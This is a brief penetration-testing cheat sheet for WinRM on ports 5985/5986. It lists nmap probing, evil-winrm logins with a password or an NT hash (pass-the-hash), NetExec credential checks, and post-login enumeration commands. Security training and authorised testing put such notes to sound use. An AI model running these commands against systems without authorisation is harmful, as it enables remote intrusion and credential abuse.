# WinRM

**Ports:** 5985, 5986

**Quick Checklist**
- [ ] Port 5985/5986 open?
- [ ] Valid credentials?
- [ ] Pass-the-Hash possible?

```bash
nmap -p 5985,5986 --script http-wsman-info IP
evil-winrm -i IP -u administrator -p 'password'
evil-winrm -i IP -u administrator -H NTHASH
nxc winrm IP -u user -p pass
```

**Once Inside**
```powershell
whoami
systeminfo
ipconfig /all
net user
net localgroup administrators
```
